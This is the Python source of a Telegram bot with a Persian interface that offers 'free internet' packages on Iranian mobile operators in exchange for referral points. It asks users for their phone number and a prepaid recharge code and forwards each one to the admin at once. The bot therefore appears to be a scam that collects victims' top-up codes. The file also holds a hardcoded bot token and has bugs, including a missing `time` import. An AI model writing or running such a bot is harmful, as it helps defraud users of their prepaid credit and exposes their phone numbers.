import telebot
from telebot import types
import json
import os
import uuid

# 配置
TOKEN = "8479022707:AAG2kKgQoWPjKm7bxy338fg7WrrdHAXsZ_c"  # 替换为您的机器人Token
ADMIN_ID = 6901191600  # 替换为管理员ID
CHANNEL_ID = "@internetfree66"  # 替换为您的频道ID

bot = telebot.TeleBot(TOKEN)

DATA_FILE = "data.json"

# 加载数据
def load_data():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "users": {},  # {user_id: {"points": 0, "blocked": False, "invites": 0}}
                "invites": {},  # {inviter: [invited_user_ids]}
                "requests": {},  # {request_id: {"user_id": , "package": , "phone": , "operator": , "charge_code": , "status": "pending"}}
                "tasks": {},  # {task_id: {"description": , "points": , "type": , "target": }}
                "settings": {"points_per_invite": 50}  # 可配置设置
            }, f, ensure_ascii=False, indent=4)
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

# 保存数据
def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

data = load_data()

# 用户状态和临时数据
user_states = {}
user_temps = {}

# 邀请链接基础
BASE_INVITE_LINK = f"https://t.me/{bot.get_me().username}?start="

# 检查频道会员状态
def check_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status != "left"
    except Exception:
        return False

# 向管理员发送日志
def send_admin_log(text, markup=None):
    try:
        bot.send_message(ADMIN_ID, text, reply_markup=markup, parse_mode="HTML")
        print(f"DEBUG: Admin log sent: {text}")
    except Exception as e:
        print(f"ERROR: Failed to send admin message: {e}")

# 主菜单
def main_menu(user_id):
    str_user_id = str(user_id)
    if str_user_id in data["users"] and data["users"][str_user_id]["blocked"]:
        bot.send_message(user_id, "🚫 شما مسدود شده‌اید. لطفاً با پشتیبانی تماس بگیرید.")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📡 دریافت بسته اینترنت", callback_data="get_internet"),
        types.InlineKeyboardButton("📊 امتیازات من", callback_data="my_points"),
        types.InlineKeyboardButton("🏆 لیدربورد", callback_data="leaderboard"),
        types.InlineKeyboardButton("📋 وظایف روزانه", callback_data="daily_tasks"),
        types.InlineKeyboardButton("📜 قوانین", callback_data="rules"),
        types.InlineKeyboardButton("📚 آموزش", callback_data="tutorial")
    )
    bot.send_message(user_id, "🌐 به ربات اینترنت رایگان خوش آمدید!\nگزینه مورد نظر را انتخاب کنید:", reply_markup=markup)
    user_states[user_id] = None
    user_temps.pop(user_id, None)

# 返回按钮
def back_to_main_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منوی اصلی", callback_data="back_main"))
    return markup

# 管理员菜单
def admin_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "📢 ارسال پیام همگانی",
        "📋 مشاهده درخواست‌ها",
        "✅ تایید/رد درخواست",
        "🎁 اعطای امتیاز",
        "🚫 مسدود/آزادسازی کاربر",
        "⚙️ تنظیم نرخ امتیاز",
        "📊 آمار کلی",
        "👥 لیست کاربران",
        "✉️ پیام به کاربر",
        "📝 ایجاد وظیفه جدید"
    )
    bot.send_message(user_id, "🛠 پنل مدیریت پیشرفته:", reply_markup=markup)
    user_states[user_id] = "admin_panel"

# 处理 /start 命令
@bot.message_handler(commands=["start"])
def start_handler(message):
    user_id = message.from_user.id
    args = message.text.split()
    if not check_joined(user_id):
        bot.send_message(user_id, f"لطفاً ابتدا در کانال {CHANNEL_ID} عضو شوید و سپس /start را بزنید.")
        return

    str_user_id = str(user_id)
    if str_user_id not in data["users"]:
        data["users"][str_user_id] = {
            "points": 0,
            "blocked": False,
            "invites": 0
        }
        save_data(data)

    # 处理邀请
    if len(args) > 1:
        inviter = args[1]
        if inviter != str_user_id and inviter in data["users"] and not data["users"][inviter]["blocked"]:
            if inviter not in data["invites"]:
                data["invites"][inviter] = []
            if user_id not in data["invites"][inviter]:
                data["invites"][inviter].append(user_id)
                data["users"][inviter]["invites"] += 1
                points = data["settings"]["points_per_invite"]
                data["users"][inviter]["points"] += points
                save_data(data)
                send_admin_log(f"👥 کاربر <b>{user_id}</b> از طریق دعوت <b>{inviter}</b> وارد شد. {points} امتیاز اضافه شد.")
                try:
                    bot.send_message(int(inviter), f"🎉 تبریک! یک نفر از لینک دعوت شما وارد شد و {points} امتیاز دریافت کردید.")
                except:
                    pass

    if user_id == ADMIN_ID:
        admin_menu(user_id)
        return

    main_menu(user_id)

# 处理回调
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data_call = call.data
    str_user_id = str(user_id)

    if not check_joined(user_id):
        bot.answer_callback_query(call.id, f"لطفاً ابتدا در کانال {CHANNEL_ID} عضو شوید.")
        return

    if str_user_id in data["users"] and data["users"][str_user_id]["blocked"]:
        bot.answer_callback_query(call.id, "🚫 شما مسدود شده‌اید.")
        return

    if data_call == "back_main":
        try:
            bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=None)
        except:
            pass
        main_menu(user_id)
        return

    if data_call == "rules":
        bot.edit_message_text(
            "📜 <b>قوانین ربات:</b>\n"
            "1. برای دریافت بسته اینترنت، دوستان خود را دعوت کنید یا وظایف روزانه را انجام دهید.\n"
            "2. هر دعوت = ۵۰ امتیاز (قابل تغییر).\n"
            "3. نقض قوانین = مسدود شدن حساب.\n",
            user_id, call.message.message_id, reply_markup=back_to_main_keyboard(), parse_mode="HTML"
        )
    elif data_call == "tutorial":
        bot.edit_message_text(
            "📚 <b>آموزش استفاده:</b>\n"
            "1. اپراتور خود را انتخاب کنید.\n"
            "2. شماره موبایل خود را وارد کنید.\n"
            "3. کد شارژ را وارد کنید.\n"
            "4. بسته اینترنت مورد نظر را انتخاب کنید.\n"
            "5. منتظر تایید ادمین باشید.\n",
            user_id, call.message.message_id, reply_markup=back_to_main_keyboard(), parse_mode="HTML"
        )
    elif data_call == "my_points":
        points = data["users"][str_user_id]["points"]
        invites = data["users"][str_user_id]["invites"]
        bot.edit_message_text(
            f"📊 <b>امتیازات شما:</b>\n"
            f"امتیاز: {points}\n"
            f"تعداد دعوت‌ها: {invites}\n"
            f"لینک دعوت شما: <code>{BASE_INVITE_LINK}{user_id}</code>",
            user_id, call.message.message_id, reply_markup=back_to_main_keyboard(), parse_mode="HTML"
        )
    elif data_call == "leaderboard":
        top_users = sorted(data["users"].items(), key=lambda x: x[1]["invites"], reverse=True)[:5]
        text = "🏆 <b>لیدربورد دعوت‌ها:</b>\n"
        for i, (uid, info) in enumerate(top_users, 1):
            text += f"{i}. کاربر {uid}: {info['invites']} دعوت، {info['points']} امتیاز\n"
        bot.edit_message_text(text, user_id, call.message.message_id, reply_markup=back_to_main_keyboard(), parse_mode="HTML")
    elif data_call == "daily_tasks":
        markup = types.InlineKeyboardMarkup(row_width=1)
        for task_id, task in data["tasks"].items():
            markup.add(types.InlineKeyboardButton(
                f"{task['description']} ({task['points']} امتیاز)",
                callback_data=f"task_{task_id}"
            ))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="back_main"))
        bot.edit_message_text("📋 <b>وظایف روزانه:</b>\nوظایف زیر را انجام دهید تا امتیاز بگیرید:", user_id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
    elif data_call.startswith("task_"):
        task_id = data_call.split("_")[1]
        if task_id in data["tasks"]:
            task = data["tasks"][task_id]
            data["users"][str_user_id]["points"] += task["points"]
            save_data(data)
            bot.answer_callback_query(call.id, f"🎉 {task['points']} امتیاز برای انجام وظیفه دریافت کردید!")
            main_menu(user_id)
    elif data_call == "get_internet":
        points = data["users"][str_user_id]["points"]
        if points < 50:
            bot.answer_callback_query(call.id, "❌ امتیاز کافی ندارید. دوستان دعوت کنید یا وظایف انجام دهید.")
            return
        user_states[user_id] = "choose_operator"
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add("ایرانسل", "همراه اول", "رایتل")
        bot.send_message(user_id, "📡 اپراتور خود را انتخاب کنید:", reply_markup=markup)
    elif data_call.startswith("admin_approve_") or data_call.startswith("admin_reject_"):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "🚫 دسترسی ندارید.")
            return
        req_id = data_call.split("_")[2]
        if req_id not in data["requests"]:
            bot.answer_callback_query(call.id, "درخواست یافت نشد.")
            return
        req = data["requests"][req_id]
        if data_call.startswith("admin_approve_"):
            req["status"] = "approved"
            bot.send_message(req["user_id"], f"🎉 درخواست بسته {req['package']} شما تایید شد! به زودی فعال می‌شود.")
            send_admin_log(f"✅ درخواست {req_id} تایید شد.")
        else:
            req["status"] = "rejected"
            bot.send_message(req["user_id"], f"❌ درخواست بسته {req['package']} شما رد شد. لطفاً بررسی کنید.")
            send_admin_log(f"❌ درخواست {req_id} رد شد.")
        save_data(data)
        bot.answer_callback_query(call.id, "عملیات انجام شد.")
        try:
            bot.delete_message(ADMIN_ID, call.message.message_id)
        except:
            pass

# 处理消息
@bot.message_handler(func=lambda m: True)
def message_handler(message):
    user_id = message.from_user.id
    text = message.text.strip()
    state = user_states.get(user_id, None)

    print(f"DEBUG: Received message from {user_id}: '{text}' in state: {state}")

    if not check_joined(user_id):
        bot.send_message(user_id, f"لطفاً ابتدا در کانال {CHANNEL_ID} عضو شوید.")
        return

    str_user_id = str(user_id)
    if str_user_id in data["users"] and data["users"][str_user_id]["blocked"] and user_id != ADMIN_ID:
        bot.send_message(user_id, "🚫 شما مسدود شده‌اید.")
        return

    # 管理面板
    if user_id == ADMIN_ID and state == "admin_panel":
        normalized_text = text.strip()
        if "ارسال پیام همگانی" in normalized_text:
            user_states[user_id] = "admin_broadcast"
            bot.send_message(user_id, "متن پیام را وارد کنید:", reply_markup=types.ReplyKeyboardRemove())
            return
        elif "مشاهده درخواست‌ها" in normalized_text:
            pending = [f"<b>{rid}</b>: کاربر {r['user_id']}, بسته {r['package']}, شماره {r['phone']}, کد شارژ {r['charge_code']}" 
                       for rid, r in data["requests"].items() if r["status"] == "pending"]
            bot.send_message(user_id, "📋 <b>درخواست‌های در انتظار:</b>\n" + "\n".join(pending) if pending else "هیچ درخواستی نیست.", parse_mode="HTML")
            admin_menu(user_id)
            return
        elif "تایید/رد درخواست" in normalized_text:
            for rid, req in data["requests"].items():
                if req["status"] == "pending":
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    markup.add(
                        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{rid}"),
                        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{rid}")
                    )
                    bot.send_message(user_id, f"📋 <b>درخواست {rid}</b>:\nکاربر {req['user_id']}, بسته {req['package']}, شماره {req['phone']}, کد شارژ {req['charge_code']}", reply_markup=markup, parse_mode="HTML")
            bot.send_message(user_id, "درخواست‌های بالا را بررسی کنید." if data["requests"] else "هیچ درخواستی نیست.")
            admin_menu(user_id)
            return
        elif "اعطای امتیاز" in normalized_text:
            user_states[user_id] = "admin_award_user"
            bot.send_message(user_id, "آی‌دی کاربر را وارد کنید:", reply_markup=types.ReplyKeyboardRemove())
            return
        elif "مسدود/آزادسازی کاربر" in normalized_text:
            user_states[user_id] = "admin_block_user"
            bot.send_message(user_id, "آی‌دی کاربر و وضعیت (مسدود/آزاد) را وارد کنید، مثلاً: 123456 مسدود", reply_markup=types.ReplyKeyboardRemove())
            return
        elif "تنظیم نرخ امتیاز" in normalized_text:
            user_states[user_id] = "admin_set_points"
            bot.send_message(user_id, f"نرخ کنونی: {data['settings']['points_per_invite']} امتیاز. نرخ جدید را وارد کنید:", reply_markup=types.ReplyKeyboardRemove())
            return
        elif "آمار کلی" in normalized_text:
            total_users = len(data["users"])
            total_invites = sum(data["users"][uid]["invites"] for uid in data["users"])
            pending_requests = sum(1 for r in data["requests"].values() if r["status"] == "pending")
            approved_requests = sum(1 for r in data["requests"].values() if r["status"] == "approved")
            bot.send_message(user_id, f"📊 <b>آمار کلی:</b>\nکاربران: {total_users}\nدعوت‌ها: {total_invites}\nدرخواست‌های در انتظار: {pending_requests}\nدرخواست‌های تایید شده: {approved_requests}", parse_mode="HTML")
            admin_menu(user_id)
            return
        elif "لیست کاربران" in normalized_text:
            users_list = "\n".join(f"<b>{uid}</b>: {info['points']} امتیاز, {info['invites']} دعوت, {'مسدود' if info['blocked'] else 'فعال'}" for uid, info in data["users"].items())
            bot.send_message(user_id, f"👥 <b>لیست کاربران:</b>\n{users_list}" if users_list else "هیچ کاربری نیست.", parse_mode="HTML")
            admin_menu(user_id)
            return
        elif "پیام به کاربر" in normalized_text:
            user_states[user_id] = "admin_message_user"
            bot.send_message(user_id, "آی‌دی کاربر را وارد کنید:", reply_markup=types.ReplyKeyboardRemove())
            return
        elif "ایجاد وظیفه جدید" in normalized_text:
            user_states[user_id] = "admin_create_task"
            bot.send_message(user_id, "توضیح وظیفه و امتیاز را وارد کنید، مثلاً: اشتراک پست 10", reply_markup=types.ReplyKeyboardRemove())
            return
        else:
            bot.send_message(user_id, "🚫 لطفاً یکی از گزینه‌های منوی ادمین را انتخاب کنید.")
            admin_menu(user_id)
            return

    # 管理其他管理员状态
    if user_id == ADMIN_ID:
        if state == "admin_broadcast":
            for uid in data["users"]:
                try:
                    bot.send_message(int(uid), text)
                except:
                    pass
            bot.send_message(user_id, "✅ پیام همگانی ارسال شد.")
            admin_menu(user_id)
            user_states[user_id] = "admin_panel"
            return
        elif state == "admin_award_user":
            if text.isdigit():
                target_id = text
                user_temps[user_id] = {"target": target_id}
                user_states[user_id] = "admin_award_points"
                bot.send_message(user_id, "مقدار امتیاز (مثبت یا منفی) را وارد کنید:")
            else:
                bot.send_message(user_id, "🚫 آی‌دی نامعتبر. دوباره وارد کنید.")
            return
        elif state == "admin_award_points":
            if text.lstrip('-').isdigit():
                points = int(text)
                target = user_temps[user_id]["target"]
                if target in data["users"]:
                    data["users"][target]["points"] += points
                    save_data(data)
                    bot.send_message(user_id, f"✅ {points} امتیاز به کاربر {target} اضافه شد.")
                    try:
                        bot.send_message(int(target), f"🎉 شما {points} امتیاز دریافت کردید!")
                    except:
                        pass
                else:
                    bot.send_message(user_id, "🚫 کاربر یافت نشد.")
                admin_menu(user_id)
                user_states[user_id] = "admin_panel"
                user_temps.pop(user_id, None)
                return
            else:
                bot.send_message(user_id, "🚫 لطفاً فقط عدد وارد کنید.")
            return
        elif state == "admin_block_user":
            parts = text.split()
            if len(parts) == 2 and parts[0].isdigit():
                target = parts[0]
                action = parts[1] == "مسدود"
                if target in data["users"]:
                    data["users"][target]["blocked"] = action
                    save_data(data)
                    bot.send_message(user_id, f"✅ کاربر {target} {'مسدود' if action else 'آزاد'} شد.")
                    try:
                        bot.send_message(int(target), f"{'🚫 حساب شما مسدود شد.' if action else '✅ حساب شما آزاد شد.'}")
                    except:
                        pass
                else:
                    bot.send_message(user_id, "🚫 کاربر یافت نشد.")
                admin_menu(user_id)
                user_states[user_id] = "admin_panel"
                return
            else:
                bot.send_message(user_id, "🚫 فرمت اشتباه. مثال: 123456 مسدود")
            return
        elif state == "admin_set_points":
            if text.isdigit():
                data["settings"]["points_per_invite"] = int(text)
                save_data(data)
                bot.send_message(user_id, f"✅ نرخ امتیاز به {text} تغییر کرد.")
                admin_menu(user_id)
                user_states[user_id] = "admin_panel"
                return
            else:
                bot.send_message(user_id, "🚫 لطفاً فقط عدد وارد کنید.")
            return
        elif state == "admin_message_user":
            if text.isdigit():
                user_temps[user_id] = {"target": text}
                user_states[user_id] = "admin_message_text"
                bot.send_message(user_id, "متن پیام را وارد کنید:")
            else:
                bot.send_message(user_id, "🚫 آی‌دی نامعتبر.")
            return
        elif state == "admin_message_text":
            target = user_temps[user_id]["target"]
            try:
                bot.send_message(int(target), text)
                bot.send_message(user_id, "✅ پیام ارسال شد.")
            except:
                bot.send_message(user_id, "🚫 خطا در ارسال پیام.")
            admin_menu(user_id)
            user_states[user_id] = "admin_panel"
            user_temps.pop(user_id, None)
            return
        elif state == "admin_create_task":
            parts = text.split()
            if len(parts) >= 2 and parts[-1].isdigit():
                description = " ".join(parts[:-1])
                points = int(parts[-1])
                task_id = str(uuid.uuid4())[:8]
                data["tasks"][task_id] = {
                    "description": description,
                    "points": points,
                    "type": "manual",
                    "target": None
                }
                save_data(data)
                bot.send_message(user_id, f"✅ وظیفه جدید '{description}' با {points} امتیاز ایجاد شد.")
                admin_menu(user_id)
                user_states[user_id] = "admin_panel"
                return
            else:
                bot.send_message(user_id, "🚫 فرمت اشتباه. مثال: اشتراک پست 10")
            return

    # 用户流程
    if state == "choose_operator":
        if text in ["ایرانسل", "همراه اول", "رایتل"]:
            user_temps[user_id] = {"operator": text}
            user_states[user_id] = "await_phone"
            bot.send_message(user_id, "📱 شماره موبایل خود را وارد کنید (10 یا 11 رقم):", reply_markup=types.ReplyKeyboardRemove())
        else:
            bot.send_message(user_id, "🚫 لطفاً یکی از اپراتورهای ذکر شده را انتخاب کنید.")
        return

    if state == "await_phone":
        phone = text
        if not phone.isdigit() or len(phone) not in [10, 11]:
            bot.send_message(user_id, "🚫 شماره نامعتبر است. لطفاً شماره 10 یا 11 رقمی وارد کنید:")
            return
        user_temps[user_id]["phone"] = phone
        # 立即发送手机号给管理员
        send_admin_log(
            f"📱 <b>شماره موبایل جدید</b>:\n"
            f"آی‌دی کاربر: {user_id}\n"
            f"اپراتور: {user_temps[user_id]['operator']}\n"
            f"شماره: {phone}"
        )
        user_states[user_id] = "await_charge_code"
        bot.send_message(user_id, "🔢 کد شارژ را وارد کنید (فقط عدد):")
        return

    if state == "await_charge_code":
        charge_code = text
        if not charge_code.isdigit():
            bot.send_message(user_id, "🚫 کد شارژ باید فقط عدد باشد. دوباره وارد کنید:")
            return
        user_temps[user_id]["charge_code"] = charge_code
        # 立即发送充值码给管理员
        send_admin_log(
            f"🔢 <b>کد شارژ جدید</b>:\n"
            f"آی‌دی کاربر: {user_id}\n"
            f"اپراتور: {user_temps[user_id]['operator']}\n"
            f"شماره: {user_temps[user_id]['phone']}\n"
            f"کد شارژ: {charge_code}"
        )
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(
            "بسته روزانه 1GB (50 امتیاز)",
            "بسته هفتگی 5GB (100 امتیاز)",
            "بسته ماهانه 10GB (150 امتیاز)"
        )
        bot.send_message(user_id, "📡 بسته مورد نظر را انتخاب کنید:", reply_markup=markup)
        user_states[user_id] = "choose_package"
        return

    if state == "choose_package":
        packages = {
            "بسته روزانه 1GB (50 امتیاز)": {"name": "روزانه 1GB", "points": 50},
            "بسته هفتگی 5GB (100 امتیاز)": {"name": "هفتگی 5GB", "points": 100},
            "بسته ماهانه 10GB (150 امتیاز)": {"name": "ماهانه 10GB", "points": 150}
        }
        if text in packages:
            package = packages[text]
            points = data["users"][str_user_id]["points"]
            if points < package["points"]:
                bot.send_message(user_id, f"❌ امتیاز کافی ندارید. نیاز: {package['points']}، موجود: {points}")
                main_menu(user_id)
                user_states.pop(user_id, None)
                user_temps.pop(user_id, None)
                return
            data["users"][str_user_id]["points"] -= package["points"]
            request_id = str(uuid.uuid4())[:8]
            data["requests"][request_id] = {
                "user_id": user_id,
                "package": package["name"],
                "phone": user_temps[user_id]["phone"],
                "operator": user_temps[user_id]["operator"],
                "charge_code": user_temps[user_id]["charge_code"],
                "status": "pending",
                "timestamp": time.time()
            }
            save_data(data)
            try:
                bot.send_message(
                    user_id,
                    f"🎉 <b>تبریک!</b> درخواست بسته {package['name']} شما با موفقیت ثبت شد.\n"
                    "لطفاً منتظر تایید ادمین باشید. نتیجه به زودی اطلاع داده می‌شود.",
                    reply_markup=types.ReplyKeyboardRemove(),
                    parse_mode="HTML"
                )
                print(f"DEBUG: Congratulation message sent to user {user_id} for package {package['name']}")
            except Exception as e:
                print(f"ERROR: Failed to send congratulation message to user {user_id}: {e}")
                bot.send_message(user_id, "🚫 خطایی رخ داد. لطفاً دوباره تلاش کنید.")
            # 发送完整请求给管理员
            send_admin_log(
                f"📥 <b>درخواست جدید</b>:\n"
                f"آی‌دی: {user_id}\n"
                f"بسته: {package['name']}\n"
                f"شماره: {user_temps[user_id]['phone']}\n"
                f"کد شارژ: {user_temps[user_id]['charge_code']}\n"
                f"اپراتور: {user_temps[user_id]['operator']}",
                markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{request_id}"),
                    types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{request_id}")
                )
            )
            main_menu(user_id)
            user_states.pop(user_id, None)
            user_temps.pop(user_id, None)
            return
        else:
            bot.send_message(user_id, "🚫 لطفاً یکی از بسته‌های ذکر شده را انتخاب کنید.")
        return

    main_menu(user_id)

# 启动机器人
print("Bot is running...")
bot.infinity_polling()
